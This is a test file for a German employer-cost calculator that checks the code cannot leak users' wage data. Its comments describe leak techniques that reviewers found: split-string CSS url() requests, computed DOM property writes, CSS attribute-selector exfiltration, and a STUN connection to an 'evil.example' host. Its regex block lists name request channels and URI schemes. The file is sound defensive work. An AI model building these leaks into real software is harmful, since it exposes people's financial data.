      const src = codeOnly(read(file), file);
      expect(/\bwindow\b/.test(src), `${file} touches window`).toBe(false);
      expect(/\bdocument\b/.test(src), `${file} touches document`).toBe(false);
      expect(/\bnavigator\b/.test(src), `${file} touches navigator`).toBe(false);
    }
  });

  it('never reads the clock, so a 2026 result stays reproducible', () => {
    for (const file of [...ENGINE_FILES, ...DATA_FILES]) {
      const src = codeOnly(read(file), file);
      expect(/Date\.now\s*\(/.test(src), `${file} calls Date.now()`).toBe(false);
      expect(/new Date\s*\(\s*\)/.test(src), `${file} reads the current date`).toBe(false);
    }
  });

  it('uses no randomness', () => {
    for (const file of [...ENGINE_FILES, ...DATA_FILES]) {
      expect(/Math\.random/.test(codeOnly(read(file), file)), `${file}`).toBe(false);
    }
  });
});

/**
 * Both files, because the shell and the interactive part are now separate. The
 * boundary owns the only link on the page and the dynamic import; the
 * calculator owns the form and the figures. A rule applied to one of them is a
 * rule with a hole in it.
 */
const UI_FILES: Array<[string, string]> = [
  ['boundary', BOUNDARY],
  ['calculator', COMPONENT],
];

/**
 * EVERY file the calculator can reach, and every JSX file among them.
 *
 * The structural rules below — the sink list, the ambient-state list, the URI
 * scheme rule, the attribute rules — used to run over the two UI files only,
 * while the file header claimed the gate reasons over the import closure. It
 * did not: only the transmission blacklist did. A helper module in the closure
 * could write `document.title = net`, or build a `stun:` URL, and meet no
 * structural rule at all.
 *
 * So the rules now run over the closure, split by what they can meaningfully
 * apply to: anything that is code gets the sink and ambient rules; anything
 * that renders gets the JSX rules as well.
 */
const CLOSURE_FILES: Array<[string, string]> = ALL.map((f) => [f, f]);
const JSX_FILES: Array<[string, string]> = ALL.filter((f) => f.endsWith('.tsx')).map((f) => [f, f]);

/**
 * The two files that legitimately contain absolute URLs, and why.
 *
 * They are the EVIDENCE registries: a source whose URL has been removed is no
 * longer a source. Their URLs are static statute addresses, never built from an
 * input and never rendered into an attribute — the JSX rules above are what
 * stop a URL becoming a request, and those run over every file that renders.
 *
 * Worth recording plainly: because rules.ts imports sources.ts for its id
 * constants, these URLs DO reach the client bundle. That is inert on its own —
 * they are public addresses of German statutes — but it is a fact about the
 * shipped page rather than an assumption, and it is why the URL-shaped rules
 * are kept absolute for every other file in the closure.
 */
const URL_BEARING_EVIDENCE = new Set([
  'data/calculators/de-employer-cost/2026/sources.ts',
  'data/calculators/de-employer-cost/2026/pap/provenance.ts',
]);

describe.each(JSX_FILES)('nothing financial or personal can reach a URL (%s)', (_label, file) => {
  const src = code(read(file), file);
  const isBoundary = file === BOUNDARY;

  it('the component writes no query string and no fragment', () => {
    const hrefs = Array.from(src.matchAll(/href=\{?["']?([^"'}\s]+)/g), (m) => m[1]);
    for (const h of hrefs) {
      expect(h.includes('?'), `href ${h} carries a query string`).toBe(false);
      expect(h.includes('#'), `href ${h} carries a fragment`).toBe(false);
    }
  });

  /**
   * Every href is a CONSTANT. Found by defeating the rule above.
   *
   * A review pass wrote `<Link href={'/r/' + netCent}>`. It has no query string
   * and no fragment, so it passed; it is an internal path, so no external-origin
   * rule touched it. And Next.js prefetches it — putting the reader's net wage
   * in our own server's access log, which is precisely what this page promises
   * never happens. "It only goes to our own server" is not a defence when the
   * page says the calculation never leaves the browser.
   *
   * Checking the SHAPE of the href rather than its content is what closes this:
   * a path that cannot vary cannot carry anything. This component links to one
   * place, and that place is a constant.
   */
  it('every href is a constant, so no path segment can carry a value', () => {
    // A JSX ATTRIBUTE spread defeats every attribute rule in this file, so it
    // is refused in EVERY file that renders. It used to be refused only in the
    // boundary, one branch below an early return, and a reviewer walked a
    // computed `data-net` attribute into the calculator through the gap. The
    // structural gate pins spreads to zero across the whole closure; this is
    // the same rule stated where a reader of the href rules will find it.
    expect(
      /<[A-Za-z][^>]*\{\s*\.\.\./s.test(src),
      'a JSX attribute spread can carry any attribute past the href rules',
    ).toBe(false);
    if (!isBoundary) {
      // The calculator renders no link at all since the shell moved out.
      expect(/href=/i.test(src), 'the calculator has grown a link').toBe(false);
      return;
    }
    const exprs = Array.from(src.matchAll(/href=(\{[^}]*\}|"[^"]*")/gi), (m) => m[1].trim());
    expect(exprs.length, 'no href found — has the cross-link gone?').toBeGreaterThan(0);
    const ALLOWED = new Set(['{CROSS_LINK_PATH[locale]}']);
    for (const e of exprs) {
      const literal = /^"\/[a-z0-9/-]*"$/.test(e);
      expect(
        literal || ALLOWED.has(e),
        `href expression is computed rather than constant: ${e}`,
      ).toBe(true);
    }
  });

  it('submitting the form cannot serialise values into a URL', () => {
    if (isBoundary) {
      // The boundary renders no form; the rule is that it must not grow one,
      // because a form outside the guarded chunk would be a form with no
      // handler — the exact silent failure the boundary exists to prevent.
      expect(/<form/i.test(src), 'the boundary has grown a form').toBe(false);
      return;
    }
    expect(/onSubmit=\{\(e\)\s*=>\s*e\.preventDefault\(\)\}/.test(src)).toBe(true);
  });

  it('offers no share or copy-link mechanism', () => {
    expect(/navigator\s*\.\s*share/.test(src)).toBe(false);
    expect(/navigator\s*\.\s*clipboard/.test(src)).toBe(false);
    expect(/writeText/.test(src)).toBe(false);
    expect(/execCommand/.test(src)).toBe(false);
  });

  it('the cross-link targets are clean canonical paths', () => {
    const copySrc = code(read(`${ENGINE_DIR}/copy.ts`), 'copy.ts');
    const literals = Array.from(copySrc.matchAll(/'(\/[a-z/-]+)'/g), (m) => m[1]);
    for (const target of ['/cena-neobsazene-pozice', '/en/cost-of-vacancy', '/de/kosten-unbesetzter-stellen']) {
      expect(literals, `missing cross-link ${target}`).toContain(target);
    }
    for (const l of literals) {
      expect(l.includes('?'), `path ${l} carries a query string`).toBe(false);
      expect(l.includes('#'), `path ${l} carries a fragment`).toBe(false);
    }
  });
});

describe.each(CLOSURE_FILES)('no external origin can be referenced at all (%s)', (_label, file) => {
  const src = code(read(file), file);
  const isBoundary = file === BOUNDARY;
  // The two evidence registries are exempt from the URL-SHAPED rules only — the
  // exemption used to remove them from this whole block, so `globalThis.name`
  // in sources.ts would have fired nothing. They stay subject to every channel,
  // ambient-state and DOM rule below.
  const urlExempt = URL_BEARING_EVIDENCE.has(file);

  it('contains no absolute URL', () => {
    if (urlExempt) return;
    const urls = Array.from(src.matchAll(/https?:\/\/[^\s'"`)]+/g), (m) => m[0]);
    expect(urls, `absolute URLs in the calculator: ${urls.join(', ')}`).toEqual([]);
  });

  it('contains no protocol-relative or bare-host reference', () => {
    if (urlExempt) return;
    expect(/["'`]\/\/[a-z0-9.-]+\./i.test(src), 'protocol-relative URL').toBe(false);
  });

  it('references no request-issuing attribute or API', () => {
    const SINKS: Array<[string, RegExp]> = [
      // Case-INSENSITIVE, and xlink included: `xlinkHref` on an SVG <use>
      // issues a real request on render and matched neither the href rules nor
      // the `src=` sink while both were anchored on lowercase.
      ['src attribute', /\bsrc\s*=/i],
      ['xlink', /xlink/i],
      ['srcSet', /\bsrcSet\b/i],
      ['poster', /\bposter\s*=/],
      ['<link> preload', /rel\s*=\s*["'{]?\s*(preload|prefetch|preconnect)/i],
      ['new Image()', /new\s+Image\s*\(/],
      ['background-image', /background-?image/i],
      ['CSS url()', /\burl\s*\(/i],
      ['dynamic node insertion', /appendChild|insertBefore|insertAdjacent/],
      ['iframe', /<iframe/i],
    ];
    for (const [label, re] of SINKS) {
      expect(re.test(src), `${label} is present in ${file}`).toBe(false);
    }

    // `import()` is a sink everywhere EXCEPT the boundary's single, literal
    // module specifier — which is how the arithmetic chunk is kept off browsers
    // that cannot parse it, and is the reason this file exists in two parts.
    // The specifier must be a plain string: an interpolated one could name any
    // URL webpack is willing to fetch.
    const dynamicImports = Array.from(src.matchAll(/\bimport\s*\(([^)]*)\)/g), (m) => m[1].trim());
    if (isBoundary) {
      expect(dynamicImports).toEqual(["'./DeEmployerCostCalculator'"]);
    } else {
      expect(dynamicImports, `${file} performs a dynamic import`).toEqual([]);
    }
  });

  /**
   * The rule that actually closes the sink list, found by trying to defeat it.
   *
   * A review pass got a working leak past all 372 assertions above with a div
   * whose `style` carried `backgroundImage: 'url(' + [...].join('') + net + ')'`
   * — no absolute URL literal anywhere, because the host was assembled from
   * fragments, and `backgroundImage` in camelCase does not match a
   * `background-image` pattern. The runtime wire test in
   * tests/e2e caught it; the source gate did not, and the source gate is the one
   * that runs without a browser.
   *
   * Enumerating one more sink would leave the next one open. So this rule
   * states an intent — the component styles itself with CSS classes and carries
   * no inline style — and claims nothing beyond it. WHAT IT DOES NOT DO, twice
   * corrected and now stated flatly: it sees the JSX attribute, and only the
   * JSX attribute. A reviewer got the same leak through
   * `node.style.setProperty(...)` in a handler; the DOM-mutation list added in
   * answer was then defeated in turn by `n['sty' + 'le']['setPro' + 'perty']`,
   * because a list of property names is textual whatever its comment says.
   * What closes the family is the structural gate at the top of this file,
   * where `style` and `setProperty` are properties the closure never declares
   * and the bracket access is a computed site that is not pinned.
   */
  it('uses no inline style and builds no URL out of fragments', () => {
    if (urlExempt) return;
    expect(/\bstyle\s*=/.test(src), 'inline style in the calculator').toBe(false);

    const literals = Array.from(src.matchAll(/'((?:[^'\\\n]|\\.)*)'|"((?:[^"\\\n]|\\.)*)"/g), (m) =>
      (m[1] ?? m[2] ?? '').toLowerCase(),
    );
    for (const l of literals) {
      expect(l.includes('http'), `string literal contains a scheme: "${l}"`).toBe(false);
      expect(l.includes('//'), `string literal contains "//": "${l}"`).toBe(false);
    }
  });

  /**
   * ANY URI scheme, not just http.
   *
   * DEFENCE IN DEPTH, NOT THE PRIMARY DEFENCE — and it is worth being exact
   * about which is which, because the difference decides what this suite is
   * actually worth.
   *
   * A literal rule can always be split: `'turn' + ':' + net` defeats any regex
   * that inspects one literal at a time, and chasing that with a smarter parser
   * is the ever-growing blacklist this file's design is supposed to reject.
   *
   * WHAT THE STRUCTURAL RULES DO AND DO NOT COVER — stated exactly, because an
   * earlier version of this comment claimed the set of request-issuing things
   * was "CLOSED" and that "none of them inspects a literal", and a reviewer
   * falsified it. `element.style.setProperty('back'+'ground-'+'image', 'ur'+'l('+…)`
   * inside an onChange handler passed all 690 assertions and issued a real
   * cross-origin request carrying the net wage: no JSX attribute, no
   * `document.`/`window.`, and no literal containing a forbidden substring. Two
   * of the rules that should have caught it — `background-image` and `url(` —
   * are textual, so they DO inspect literals, and the inline-style rule matches
   * only the JSX attribute, not a DOM write.
   *
   * The honest statement is narrower. The rules deny sensitive state a path to
   * the ENUMERATED effects: the transmission and storage APIs in `the
   * calculator transmits nothing`, the request channels and ambient state
   * below, the DOM-mutation APIs added after that reviewer's finding, and — for
   * files that render — the attribute rules. That enumeration is a MODEL of the
   * platform's sinks, kept current by mutation tests; it is not a proof that no
   * other sink exists.
   *
   * The DOM-mutation rules below are NOT what makes that family unwritable, and
   * saying so was itself a finding: they are an Array<[string, RegExp]> matching
   * property names, so `n['sty' + 'le']` walks straight past them. The reasoning
   * behind them is sound — a declarative React component has no business
   * touching a node — but only the structural gate at the top of this file
   * enforces it in a way that survives a computed property name.
   *
   * This scheme rule remains defence in depth. It catches the careless case and
   * is not asked to catch the determined one.
   *
   * A review pass designed a leak that carried the net wage and the Article-9
   * church flag out through `new RTCPeerConnection({ iceServers: [{ urls:
   * 'stun:' + tag + '.evil.example' }] })`. It defeated both layers at once: the
   * source gate knew only `http` and `//`, and the Playwright wire watcher
   * observes HTTP requests, so a STUN/UDP resolution and its DNS lookup are
   * invisible to it.
   *
   * The fix is not to add `stun` to a list. It is to stop enumerating schemes:
   * this component has no business naming ANY scheme, so any `word:` that looks
   * like one fails.
   */
  it('names no URI scheme of any kind', () => {
    if (urlExempt) return;
    const literals = Array.from(src.matchAll(/'((?:[^'\\\n]|\\.)*)'|"((?:[^"\\\n]|\\.)*)"|`((?:[^`\\]|\\.)*)`/g), (m) =>
      m[1] ?? m[2] ?? m[3] ?? '',
    );
    // Known request-issuing schemes, named. A prose colon ("Note: the ceiling")
    // is not a scheme, so the rule cannot simply flag every `word:` — but the
    // scheme need not be followed by anything to be dangerous: `'stun:' + host`
    // splits it across a concatenation, and an earlier version of this rule
    // required a character after the colon and let exactly that through.
    const SCHEMES =
      /^(https?|ftp|ws|wss|stun|turn|turns|blob|data|javascript|file|mailto|tel|sms|intent|about|chrome|resource|view-source):/i;
    for (const l of literals) {
      const trimmed = l.trim();
      expect(SCHEMES.test(trimmed), `string literal names a URI scheme: "${trimmed.slice(0, 60)}"`).toBe(false);
      expect(
        /:\/\//.test(trimmed),
        `string literal contains a scheme separator: "${trimmed.slice(0, 60)}"`,
      ).toBe(false);
    }
  });

  /**
   * Sinks that issue a request without any of the APIs already listed, and
   * ambient browser state that leaves the machine without this code issuing a
   * request at all.
   *
   * The second half matters because a third-party analytics bundle is mounted
   * on this page by the site chrome. Parking a payroll figure in
   * `document.title` or `window.name` hands it to that bundle without this
   * component making a single request — and the component was exempt from the
   * browser-global purity check that covers the engine.
   */
  it('opens no other request channel and parks nothing in ambient state', () => {
    const CHANNELS: Array<[string, RegExp]> = [
      ['RTCPeerConnection', /RTCPeerConnection/],
      ['window.open', /\bopen\s*\(/],
      ['<object data>', /<object\b|\bdata\s*=\s*\{/i],
      ['<embed>', /<embed\b/i],
      ['anchor ping', /\bping\s*=/],
      ['formAction', /formAction/i],
      ['meta refresh', /http-equiv/i],
      ['navigator.*', /\bnavigator\s*\./],
      ['importScripts / worker', /importScripts|new\s+Worker|serviceWorker/],
      ['SharedWorker', /SharedWorker/],
    ];
    for (const [label, re] of CHANNELS) {
      expect(re.test(src), `${label} is present in ${file}`).toBe(false);
    }

    /**
     * THE DOM IS A SINK. This list names the ways of reaching it in the plain,
     * and it catches the careless case only.
     *
     * `node.style.setProperty('back'+'ground-'+'image', 'ur'+'l('+host+net+')')`
     * issues a real cross-origin request and contains no forbidden substring
     * anywhere. When this list was added its comment claimed the rule "holds
     * however the strings inside are built". It does not, and the next reviewer
     * proved it in one line: `n['sty' + 'le']['setPro' + 'perty'](...)` matches
     * none of these patterns. Nothing textual can, because every part of the
     * expression can be assembled at run time.
     *
     * The claim the list was reaching for is true, and it is enforced at the
     * top of this file instead: React owns the DOM here, so `style`,
     * `setProperty`, `setAttribute`, `innerHTML`, `dataset` and `classList` are
     * properties the closure never declares, and a bracketed property name is a
     * computed access site that is not pinned. Both fail structurally.
     */
    const DOM_MUTATION: Array<[string, RegExp]> = [
      ['inline style write', /\.\s*style\b/],
      ['setProperty', /setProperty/],
      ['setAttribute / removeAttribute', /(set|remove)Attribute/],
      ['innerHTML / outerHTML', /(inner|outer)HTML/],
      ['insertAdjacentHTML', /insertAdjacent/],
      ['classList', /classList/],
      ['dataset', /\.\s*dataset\b/],
      ['createElement', /createElement/],
      ['querySelector / getElementById', /querySelector|getElementById/],
      // `[A-Za-z_$]\w*\s*\.` rather than a bare `\.`, because the spread
      // operator in `[...current, id]` puts a dot immediately before the word.
      ['a held node (ref)', /\buseRef\b|\bref\s*=|[A-Za-z_$]\w*\s*\.\s*current\b/],
      ['currentTarget', /currentTarget/],
    ];
    for (const [label, re] of DOM_MUTATION) {
      expect(re.test(src), `${label} — a DOM sink — is present in ${file}`).toBe(false);
    }
  });

  it('parks nothing in ambient browser state', () => {
    const AMBIENT: Array<[string, RegExp]> = [
      ['document.title', /document\s*\.\s*title/],
      ['window.name', /window\s*\.\s*name/],
      ['history.state', /history\s*\.\s*(state|pushState|replaceState)/],
      ['document.cookie', /document\s*\.\s*cookie/],
      ['any window access', /\bwindow\s*\./],
      ['any document access', /\bdocument\s*\./],
      // The aliases. `globalThis.name = net` parks the wage in window.name for
      // the analytics bundle without the string "window" appearing anywhere.
      ['globalThis', /\bglobalThis\b/],
      ['self / top / parent / frames', /\b(self|top|parent|frames)\s*\./],
      ['bracket access to a global', /\b(globalThis|window|self|top)\s*\[/],
    ];
    for (const [label, re] of AMBIENT) {
      expect(re.test(src), `${label} is written by the calculator`).toBe(false);
    }
  });

  /**
   * No attribute carries a computed value out to CSS.
   *
   * The leak this closes is a two-file conspiracy: a `data-net={netCent}` on the
   * results div plus one attribute-selector rule in styles.css, which no test in
   * this suite reads, exfiltrating digit by digit through background-image
   * requests. Neither file alone looks wrong.
   *
   * `data-severity` on the notes list is the one attribute that legitimately
   * varies, and it carries a fixed vocabulary of three words, none of them
   * derived from an input.
   */
  it('the stylesheet cannot read a value out of this component', () => {
    // The conspirator half. The data-attribute rule exists because an attribute
    // plus one CSS attribute-selector rule exfiltrates digit by digit through
    // background-image — and styles.css was read by no test at all, so only
    // half the conspiracy was ever inspected.
    //
    // WHICH RULES GET INSPECTED WAS ITSELF THE HOLE. This filtered the
    // stylesheet to chunks whose text contains `.ecc`, and the calculator's own
    // form is `.pcalc__grid`: 88 of the rules that style it carried no `.ecc`
    // at all and were never looked at. A reviewer paired a spread-injected
    // `data-net` attribute with a `.pcalc__grid [data-net^="1"]` rule and both
    // halves passed. The rule set is now derived from what the components
    // actually render, so a class cannot be styled outside the gate, and the
    // splitter descends into @media instead of reading a media prelude as a
    // selector.
    const css = fs.readFileSync(path.join(ROOT, 'styles.css'), 'utf8');
    const rendered = renderedClasses();
    expect(rendered.size, 'no class names were recovered from the components').toBeGreaterThan(10);
    expect(rendered.has('pcalc__grid'), 'the form wrapper class is missing').toBe(true);

    const rules = cssRules(css);
    expect(rules.length, 'the stylesheet parsed to implausibly few rules').toBeGreaterThan(200);

    const ours = rules.filter((r) => [...rendered].some((c) => r.selector.includes(`.${c}`)));
    expect(ours.length, 'no rule in the stylesheet styles this calculator').toBeGreaterThan(20);
    for (const rule of ours) {
      // One attribute selector is allowed by name: data-severity, whose values
      // are a fixed vocabulary of three words set by the engine and never
      // derived from an input. Any other attribute selector could pair with an
      // attribute carrying a figure.
      for (const a of Array.from(rule.selector.matchAll(/\[([a-zA-Z-]+)/g), (m) => m[1])) {
        expect(a, `an attribute selector on a calculator class: ${rule.selector}`).toBe('data-severity');
      }
      expect(
        /url\s*\(/i.test(rule.body),
        `a calculator rule issues a request: ${rule.selector}`,
      ).toBe(false);
    }

    // And the variant that needs no class of ours at all: a selector that reads
    // an attribute and fetches something is an exfiltration channel wherever it
    // sits in the stylesheet, because the attribute is what carries the value.
    for (const rule of rules) {
      const reads = /\[[a-zA-Z-]+/.test(rule.selector);
      const fetches = /url\s*\(/i.test(rule.body);
      expect(
        reads && fetches,
        `an attribute selector paired with a request: ${rule.selector}`,
      ).toBe(false);
    }
  });

  it('puts no computed value into any attribute that CSS or a URL can read', () => {
    // Not just data-*: className, id, title and aria-* are all selectable and
    // all can carry a number.
    const ATTR = /\b(data-[a-z-]+|className|id|title|aria-[a-z-]+)\s*=\s*(\{[^}]*\}|"[^"]*")/g;
    const attrs = Array.from(src.matchAll(ATTR), (m) => [m[1], m[2]] as const);
    for (const [name, value] of attrs) {
      if (name === 'data-severity') {
        expect(value, 'data-severity must carry the note severity and nothing else').toBe('{n.severity}');
        continue;
      }
      // Allowed dynamic values: a locale-keyed lookup and a loop key. Neither
      // can carry a figure, and both are named rather than pattern-matched.
      const ALLOWED_DYNAMIC = new Set(['{LANG[locale]}', '{c.key}', '{n.key}', '{i.field}', '{k}', '{b}', '{c.id}']);
      if (ALLOWED_DYNAMIC.has(value)) continue;
      // A translation lookup. `tr(FIELD.u1)` resolves to a fixed sentence from
      // copy.ts and cannot carry a figure — the copy module holds no input and
      // is itself inside this gate's file list.
      if (/^\{tr\([A-Z_]+(\.[A-Za-z0-9_]+)?\)\}$/.test(value)) continue;
      expect(/^"[a-zA-Z0-9 _-]*"$/.test(value), `${name} carries a computed value: ${value}`).toBe(true);
    }
  });

  /**
   * The registry legitimately holds absolute URLs — they are the evidence. It
   * must never be imported by the component, because that would put those URLs
   * in the page's bundle where an attribute could reach them.
   */
  it('nothing that RENDERS imports the source registry', () => {
    // Scoped to files that render. The engine reaches sources.ts transitively
    // through rules.ts, which is how the registry's ids stay authoritative; what
    // must not happen is a component holding those URLs where an attribute
    // could reach one.
    if (!file.endsWith('.tsx')) return;
    expect(/sources['"]/.test(src), `${file} imports the source registry`).toBe(false);
  });
});
